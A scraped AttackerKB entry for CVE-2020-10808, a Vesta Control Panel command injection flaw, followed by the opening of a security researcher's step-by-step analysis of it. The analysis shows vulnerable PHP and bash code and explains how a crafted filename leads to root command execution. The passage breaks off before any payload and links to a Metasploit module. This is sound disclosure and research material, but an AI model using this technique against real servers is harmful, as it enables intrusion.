AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

##### Advisory

Description:
URL:

Add Another

##### Exploit

Description:
URL:

Add Another

##### Mitigation

Description:
URL:

Add Another

##### Related AttackerKB Topic

Description:
URL:

Add Another

##### Government or Industry Alert

Description:
URL:

Add Another

##### Miscellaneous

Description:
URL:

Add Another

Cancel
Submit

![](/static/private/img/attacker-value/dark/attacker-value-0.svg)

Attacker Value
###### Unknown

(0 users assessed)

![](/static/private/img/attacker-value/dark/attacker-value-0.svg)

Exploitability
###### Unknown

(0 users assessed)

User Interaction
###### [None](/search?userInteraction=NONE)

Privileges Required
###### [Low](/search?privilegesRequired=LOW)

Attack Vector
###### [Network](/search?attackVector=NETWORK)

0

# CVE-2020-10808

Disclosure Date: March 22, 2020
‚Ä¢
(Last updated November 27, 2024) ‚ñæ

[CVE-2020-10808](/search?q=CVE-2020-10808)
CVSS v3 Base Score:
8.8

Report As Exploited in the Wild

MITRE ATT&CK[Log in to add MITRE ATT&CK tag](/login)
Add MITRE ATT&CK tactics and techniques that apply to this CVE.

### MITRE ATT&CK

Select the MITRE ATT&CK Tactics that apply to this CVE

Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementCollectionExfiltrationCommand and ControlImpact

##### Collection

Select any Techniques used:

Data from Local System

Data from Removable Media

Data from Network Shared Drive

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Data Staged

Data Staged: Local Data Staging

Data Staged: Remote Data Staging

Screen Capture

Email Collection

Email Collection: Local Email Collection

Email Collection: Remote Email Collection

Email Collection: Email Forwarding Rule

Clipboard Data

Automated Collection

Audio Capture

Video Capture

Man in the Browser

Data from Information Repositories

Data from Information Repositories: Confluence

Data from Information Repositories: Sharepoint

Data from Cloud Storage Object

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Archive Collected Data

Archive Collected Data: Archive via Utility

Archive Collected Data: Archive via Library

Archive Collected Data: Archive via Custom Method

##### Command and Control

Select any Techniques used:

Data Obfuscation

Data Obfuscation: Junk Data

Data Obfuscation: Steganography

Data Obfuscation: Protocol Impersonation

Fallback Channels

Application Layer Protocol

Application Layer Protocol: Web Protocols

Application Layer Protocol: File Transfer Protocols

Application Layer Protocol: Mail Protocols

Application Layer Protocol: DNS

Proxy

Proxy: Internal Proxy

Proxy: External Proxy

Proxy: Multi-hop Proxy

Proxy: Domain Fronting

Communication Through Removable Media

Non-Application Layer Protocol

Web Service

Web Service: Dead Drop Resolver

Web Service: Bidirectional Communication

Web Service: One-Way Communication

Multi-Stage Channels

Ingress Tool Transfer

Data Encoding

Data Encoding: Standard Encoding

Data Encoding: Non-Standard Encoding

Traffic Signaling

Traffic Signaling: Port Knocking

Remote Access Software

Dynamic Resolution

Dynamic Resolution: Fast Flux DNS

Dynamic Resolution: Domain Generation Algorithms

Dynamic Resolution: DNS Calculation

Non-Standard Port

Protocol Tunneling

Encrypted Channel

Encrypted Channel: Symmetric Cryptography

Encrypted Channel: Asymmetric Cryptography

##### Credential Access

Select any Techniques used:

OS Credential Dumping

OS Credential Dumping: LSASS Memory

OS Credential Dumping: Security Account Manager

OS Credential Dumping: NTDS

OS Credential Dumping: LSA Secrets

OS Credential Dumping: Cached Domain Credentials

OS Credential Dumping: DCSync

OS Credential Dumping: Proc Filesystem

OS Credential Dumping: /etc/passwd and /etc/shadow

Network Sniffing

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Brute Force

Brute Force: Password Guessing

Brute Force: Password Cracking

Brute Force: Password Spraying

Brute Force: Credential Stuffing

Two-Factor Authentication Interception

Forced Authentication

Exploitation for Credential Access

Steal Application Access Token

Steal Web Session Cookie

Unsecured Credentials

Unsecured Credentials: Credentials In Files

Unsecured Credentials: Credentials in Registry

Unsecured Credentials: Bash History

Unsecured Credentials: Private Keys

Unsecured Credentials: Cloud Instance Metadata API

Unsecured Credentials: Group Policy Preferences

Credentials from Password Stores

Credentials from Password Stores: Keychain

Credentials from Password Stores: Securityd Memory

Credentials from Password Stores: Credentials from Web Browsers

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Steal or Forge Kerberos Tickets

Steal or Forge Kerberos Tickets: Golden Ticket

Steal or Forge Kerberos Tickets: Silver Ticket

Steal or Forge Kerberos Tickets: Kerberoasting

##### Defense Evasion

Select any Techniques used:

Direct Volume Access

Rootkit

Obfuscated Files or Information

Obfuscated Files or Information: Binary Padding

Obfuscated Files or Information: Software Packing

Obfuscated Files or Information: Steganography

Obfuscated Files or Information: Compile After Delivery

Obfuscated Files or Information: Indicator Removal from Tools

Masquerading

Masquerading: Invalid Code Signature

Masquerading: Right-to-Left Override

Masquerading: Rename System Utilities

Masquerading: Masquerade Task or Service

Masquerading: Match Legitimate Name or Location

Masquerading: Space after Filename

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelg√§nging

Process Injection: VDSO Hijacking

Indicator Removal on Host

Indicator Removal on Host: Clear Windows Event Logs

Indicator Removal on Host: Clear Linux or Mac System Logs

Indicator Removal on Host: Clear Command History

Indicator Removal on Host: File Deletion

Indicator Removal on Host: Network Share Connection Removal

Indicator Removal on Host: Timestomp

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Modify Registry

Trusted Developer Utilities Proxy Execution

Trusted Developer Utilities Proxy Execution: MSBuild

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Deobfuscate/Decode Files or Information

BITS Jobs

Indirect Command Execution

Traffic Signaling

Traffic Signaling: Port Knocking

Rogue Domain Controller

Exploitation for Defense Evasion

Signed Script Proxy Execution

Signed Script Proxy Execution: PubPrn

Signed Binary Proxy Execution

Signed Binary Proxy Execution: Compiled HTML File

Signed Binary Proxy Execution: Control Panel

Signed Binary Proxy Execution: CMSTP

Signed Binary Proxy Execution: InstallUtil

Signed Binary Proxy Execution: Mshta

Signed Binary Proxy Execution: Msiexec

Signed Binary Proxy Execution: Odbcconf

Signed Binary Proxy Execution: Regsvcs/Regasm

Signed Binary Proxy Execution: Regsvr32

Signed Binary Proxy Execution: Rundll32

XSL Script Processing

Template Injection

File and Directory Permissions Modification

File and Directory Permissions Modification: Windows File and Directory Permissions Modification

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

Execution Guardrails

Execution Guardrails: Environmental Keying

Group Policy Modification

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Unused/Unsupported Cloud Regions

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Subvert Trust Controls

Subvert Trust Controls: Gatekeeper Bypass

Subvert Trust Controls: Code Signing

Subvert Trust Controls: SIP and Trust Provider Hijacking

Subvert Trust Controls: Install Root Certificate

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Impair Defenses

Impair Defenses: Disable or Modify Tools

Impair Defenses: Disable Windows Event Logging

Impair Defenses: HISTCONTROL

Impair Defenses: Disable or Modify System Firewall

Impair Defenses: Indicator Blocking

Impair Defenses: Disable or Modify Cloud Firewall

Hide Artifacts

Hide Artifacts: Hidden Files and Directories

Hide Artifacts: Hidden Users

Hide Artifacts: Hidden Window

Hide Artifacts: NTFS File Attributes

Hide Artifacts: Hidden File System

Hide Artifacts: Run Virtual Instance

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Modify Cloud Compute Infrastructure

Modify Cloud Compute Infrastructure: Create Snapshot

Modify Cloud Compute Infrastructure: Create Cloud Instance

Modify Cloud Compute Infrastructure: Delete Cloud Instance

Modify Cloud Compute Infrastructure: Revert Cloud Instance

##### Discovery

Select any Techniques used:

System Service Discovery

Application Window Discovery

Query Registry

System Network Configuration Discovery

Remote System Discovery

System Owner/User Discovery

Network Sniffing

Network Service Scanning

System Network Connections Discovery

Process Discovery

Permission Groups Discovery

Permission Groups Discovery: Local Groups

Permission Groups Discovery: Domain Groups

Permission Groups Discovery: Cloud Groups

System Information Discovery

File and Directory Discovery

Account Discovery

Account Discovery: Local Account

Account Discovery: Domain Account

Account Discovery: Email Account

Account Discovery: Cloud Account

Peripheral Device Discovery

System Time Discovery

Network Share Discovery

Password Policy Discovery

Browser Bookmark Discovery

Domain Trust Discovery

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Software Discovery

Software Discovery: Security Software Discovery

Cloud Service Discovery

Cloud Service Dashboard

##### Execution

Select any Techniques used:

Windows Management Instrumentation

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Command and Scripting Interpreter

Command and Scripting Interpreter: PowerShell

Command and Scripting Interpreter: AppleScript

Command and Scripting Interpreter: Windows Command Shell

Command and Scripting Interpreter: Unix Shell

Command and Scripting Interpreter: Visual Basic

Command and Scripting Interpreter: Python

Command and Scripting Interpreter: JavaScript/JScript

Software Deployment Tools

Native API

Shared Modules

Exploitation for Client Execution

User Execution

User Execution: Malicious Link

User Execution: Malicious File

Inter-Process Communication

Inter-Process Communication: Component Object Model

Inter-Process Communication: Dynamic Data Exchange

System Services

System Services: Launchctl

System Services: Service Execution

##### Exfiltration

Select any Techniques used:

Exfiltration Over Other Network Medium

Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Automated Exfiltration

Scheduled Transfer

Data Transfer Size Limits

Exfiltration Over C2 Channel

Exfiltration Over Alternative Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

Exfiltration Over Physical Medium

Exfiltration Over Physical Medium: Exfiltration over USB

Transfer Data to Cloud Account

Exfiltration Over Web Service

Exfiltration Over Web Service: Exfiltration to Code Repository

Exfiltration Over Web Service: Exfiltration to Cloud Storage

##### Impact

Select any Techniques used:

Data Destruction

Data Encrypted for Impact

Service Stop

Inhibit System Recovery

Defacement

Defacement: Internal Defacement

Defacement: External Defacement

Firmware Corruption

Resource Hijacking

Network Denial of Service

Network Denial of Service: Direct Network Flood

Network Denial of Service: Reflection Amplification

Endpoint Denial of Service

Endpoint Denial of Service: OS Exhaustion Flood

Endpoint Denial of Service: Service Exhaustion Flood

Endpoint Denial of Service: Application Exhaustion Flood

Endpoint Denial of Service: Application or System Exploitation

System Shutdown/Reboot

Account Access Removal

Disk Wipe

Disk Wipe: Disk Content Wipe

Disk Wipe: Disk Structure Wipe

Data Manipulation

Data Manipulation: Stored Data Manipulation

Data Manipulation: Transmitted Data Manipulation

Data Manipulation: Runtime Data Manipulation

##### Initial Access

Select any Techniques used:

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Replication Through Removable Media

External Remote Services

Drive-by Compromise

Exploit Public-Facing Application

Supply Chain Compromise

Supply Chain Compromise: Compromise Software Dependencies and Development Tools

Supply Chain Compromise: Compromise Software Supply Chain

Supply Chain Compromise: Compromise Hardware Supply Chain

Trusted Relationship

Hardware Additions

Phishing

Phishing: Spearphishing Attachment

Phishing: Spearphishing Link

Phishing: Spearphishing via Service

##### Lateral Movement

Select any Techniques used:

Remote Services

Remote Services: Remote Desktop Protocol

Remote Services: SMB/Windows Admin Shares

Remote Services: Distributed Component Object Model

Remote Services: SSH

Remote Services: VNC

Remote Services: Windows Remote Management

Software Deployment Tools

Taint Shared Content

Replication Through Removable Media

Exploitation of Remote Services

Internal Spearphishing

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Remote Service Session Hijacking

Remote Service Session Hijacking: SSH Hijacking

Remote Service Session Hijacking: RDP Hijacking

Lateral Tool Transfer

##### Persistence

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Account Manipulation

Account Manipulation: Additional Azure Service Principal Credentials

Account Manipulation: Exchange Email Delegate Permissions

Account Manipulation: Add Office 365 Global Administrator Role

Account Manipulation: SSH Authorized Keys

External Remote Services

Create Account

Create Account: Local Account

Create Account: Domain Account

Create Account: Cloud Account

Office Application Startup

Office Application Startup: Office Template Macros

Office Application Startup: Office Test

Office Application Startup: Outlook Forms

Office Application Startup: Outlook Home Page

Office Application Startup: Outlook Rules

Office Application Startup: Add-ins

Browser Extensions

BITS Jobs

Traffic Signaling

Traffic Signaling: Port Knocking

Server Software Component

Server Software Component: SQL Stored Procedures

Server Software Component: Transport Agent

Server Software Component: Web Shell

Implant Container Image

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Compromise Client Software Binary

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

##### Privilege Escalation

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelg√§nging

Process Injection: VDSO Hijacking

Exploitation for Privilege Escalation

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Group Policy Modification

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Submit

Metasploit Module

[Vesta Control Panel Authenticated Remote Code Execution](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/vestacp_exec.rb "Vesta Control Panel Authenticated Remote Code Execution")

### Topic Tags

Select the tags that apply to this CVE (Assessment added tags are disabled and cannot be removed)

What makes this of high-value to an attacker?

Vulnerable in default configuration

Unauthenticated

Observed in state-sponsored attacks

Observed in ransomware attacks

Gives privileged access

Easy to weaponize

Difficult to patch

Common in enterprise

CISA KEV Listed

What makes this of low-value to an attacker?

Vulnerable in uncommon configuration

Requires user interaction

Requires physical access

Requires elevated access

No useful access

Difficult to weaponize

Authenticated

Submit

## Description

Vesta Control Panel (VestaCP) through 0.9.8-26 allows Command Injection via the schedule/backup Backup Listing Endpoint. The attacker must be able to create a crafted filename on the server, as demonstrated by an FTP session that renames .bash\_logout to a .bash\_logout‚Äô substring followed by shell metacharacters.

[See More
See Less](#description)

* [Ratings & Analysis](#ratings-analysis)
* [Vulnerability Details](#vuln-details)

## Add Assessment

[Log in to be the first to add an Assessment](/login)

No one has assessed this topic. Be the first to add your voice to the community.

##### CVSS V3 Severity and Metrics

Data provided by the [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
Base Score:

8.8 High

Impact Score:

5.9

Exploitability Score:

2.8

Vector:

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

Attack Vector (AV):

Network

Attack Complexity (AC):

Low

Privileges Required (PR):

Low

User Interaction (UI):

None

Scope (S):

Unchanged

Confidentiality (C):

High

Integrity (I):

High

Availability (A):

High

### General Information

Offensive Application
Unknown
Utility Class
Unknown
Ports

Unknown

OS

Unknown

Vulnerable Versions
n/a
Prerequisites

Unknown

Discovered By

Unknown

PoC Author

Unknown

Metasploit Module
exploit/linux/http/vestacp\_exec
Reporter

Unknown

### Vendors

* vestacp

### Products

* vesta control panel

### Metasploit Modules

[Vesta Control Panel Authenticated Remote Code Execution (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/vestacp\_exec.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/vestacp_exec.rb)

### References

##### Canonical

[CVE-2020-10808 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10808)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10808)
##### Miscellaneous

<https://forum.vestacp.com/viewforum.php?f=25><https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis><https://github.com/rapid7/metasploit-framework/pull/13094><http://packetstormsecurity.com/files/157111/Vesta-Control-Panel-Authenticated-Remote-Code-Execution.html><http://packetstormsecurity.com/files/157219/Vesta-Control-Panel-Authenticated-Remote-Code-Execution.html>

### Additional Info

Authenticated

Unknown
Exploitable

Unknown
Reliability

Unknown
Stability

Unknown
Available Mitigations

Unknown
Shelf Life

Unknown
Userbase/Installbase

Unknown
Patch Effectiveness

Unknown

![](/static/public/img/rapid7-avatar.svg)

Rapid7

###### Technical Analysis

# Report as Emergent Threat Response

Please provide the link to the ETR blog if available.

Add a reference URL (optional):

Report as ETR
Update Report

# Report as Exploited in the Wild

AttackerKB users want to know this is information they can trust.

Help the community by indicating the source(s) of your knowledge:

* Vendor Advisory

  Add a reference URL
  (required):

  Please provide a link to the Vendor Advisory.
* Government or Industry Alert

  Add a reference URL
  (required):

  Please provide a link to the Government or Industry Alert.
* Threat Feed

  Add a reference URL
  (required):

  Please provide a link to the Threat Feed.
* News Article or Blog

  Add a reference URL
  (required):

  Please provide a link to the News Reference.
* Exploitation personally observed in an environment (client, customer, employer, or personal environment)

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/3KD0ssm6Ii/cve-2020-10808/assess) as evidence to support your personal observation claim.
* Other:

  Please explain the source of your report.

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/3KD0ssm6Ii/cve-2020-10808/assess) as evidence of the source of your report.

Report and add more details
Report as Exploited
Update Report

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

Cancel
Submit

![](/static/public/img/close-white.svg)
## Quick Cookie Notification

This site uses cookies for anonymized analytics to improve the site.

Rapid7 will never sell the data collected on this site.

I AGREE, LET‚ÄôS GO!

---

View our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/) for full details

This site uses cookies for anonymized analytics. For more information or to change your cookie settings, view our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/).

![](/static/public/img/close-white.svg)

[Terms of Use](/terms)
[Code of Conduct](/codeofconduct)
[FAQ](/faq)
[Changelog](/changelog)
[Privacy Policy](https://rapid7.com/privacy-policy)
Contact
[API](https://api.attackerkb.com/v1/api-docs/docs)
[A Rapid7 Project](https://www.rapid7.com)

[![](/static/public/img/logo-condensed-dark.png)](/)



=== Content from pentest.blog_ba046ba6_20250119_142633.html ===

[Skip to main content](#content)
[![Pentest Blog](https://pentest.blog/wp-content/uploads/pentestblog-color-e1508706802866.png)](https://pentest.blog/)

Toggle navigation

* [Advisories](https://pentest.blog/category/advisories/)
* [Operating System](https://pentest.blog/category/operating-system/)
* [Application Security](https://pentest.blog/category/application-security/)
* [Network](https://pentest.blog/category/network/)
* [Tools](https://pentest.blog/category/tools/)
* [Article Series](https://pentest.blog/article-series/)
* [About Us](https://pentest.blog/about-us/)

![vesta panel](https://pentest.blog/wp-content/uploads/vesta-generic-e1584541028414.png)
# Vesta Control Panel Second Order Remote Code Execution 0day Step-by-Step Analysis

 [March 18, 2020March 18, 2020](https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/)  [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)
[Advisories](https://pentest.blog/category/advisories/)

I believe that doing a security research is all about trying to understand high-level of architecture of the products and finding a creative attack vectors.

I hope this blog post will show some the readers how to start doing security research.

#### Installation

You can install that software Debian/Ubuntu or CentOS. I‚Äôve installed it on Ubuntu 18.10 x64 by following 3 steps at¬†<http://vestacp.com/install/>.

```
# Connect to your server as root via SSH
ssh [[email¬†protected]](/cdn-cgi/l/email-protection)
# Download installation script
curl -O http://vestacp.com/pub/vst-install.sh
# Run it
bash vst-install.sh
```
#### Vuln 0x01 ‚Äì Security Design of Bash Script Executions

During static analysis of the web application, I‚Äôve seen lots of bash script execution behind the scene. Let me give your one example from login process.

```
// VESTA_CMD variable definition is as follow.
define('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');
// ... OMITTED CODE...
if (isset($_POST['user']) && isset($_POST['password'])) {
    if(isset($_SESSION['token']) && isset($_POST['token']) && $_POST['token'] == $_SESSION['token']) {
        $v_user = escapeshellarg($_POST['user']);
        $v_ip = escapeshellarg($_SERVER['REMOTE_ADDR']);

        // Get user's salt
        $output = '';
        exec (VESTA_CMD."v-get-user-salt ".$v_user." ".$v_ip." json" , $output, $return_var);
        $pam = json_decode(implode('', $output), true);
        // ... OMITTED CODE...
```

Of course, having a input validation on user parameter would be better even if it‚Äôs securely used in **exec()** call. In order to find a possible insecure usage of **exec()** function call, I‚Äôve reviewed all the source code but couldn‚Äôt find any. In the meantime, you may thinking about sudo command at the beginning of the **VESTA\_CMD** variable. Yes, all the bash scripts will be executed by sudo binary through administrator interface (PHP).

Following screenshot show that PHP-FPM process is running with admin user privileges, which is capable executing sudo command and eventually executes bash scripts.

![](https://pentest.blog/wp-content/uploads/vestacp-1.png)

So that means, admin user must have a root privileges. Here is the content of the sudoers file. Bash scripts, executables shouldn‚Äôt be executed under the context of privileged accounts, especially with user controllable datas.

```
root@mincelocal:~# cat /etc/sudoers|grep admin
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL
root@mincelocal:~#
```

As I said before, all **exec()** or similar function calls has been securely used in the code base. That means, we can NOT directly have command injection vulnerability. But what if we can find an insecure command within one of the bash script with a user controllable variable ?

#### Vuln 0x02 ‚Äì Second Order RCE on Backup Process

While I was reviewing bash script of some of the functionalists, one thing caught my attention. When you send GET request to the https://url:8083/schedule/backup/ endpoint, it will executed following PHP codes.

```
include($_SERVER['DOCUMENT_ROOT']."/inc/main.php");

$v_username = escapeshellarg($user);
exec (VESTA_CMD."v-schedule-user-backup ".$v_username, $output, $return_var);
```

Let‚Äôs have a look at content of the **v-schedule-user-backup** bash script file.

```
#!/bin/bash

# Argument definition
user=$1

# Includes
source $VESTA/func/main.sh
source $VESTA/conf/vesta.conf

check_args '1' "$#" 'USER'
is_format_valid 'user'
is_system_enabled "$BACKUP_SYSTEM" 'BACKUP_SYSTEM'
is_object_valid 'user' 'USER' "$user"
is_backup_enabled
is_backup_scheduled 'backup'

# Adding backup task to  the queue
log=$VESTA/log/backup.log
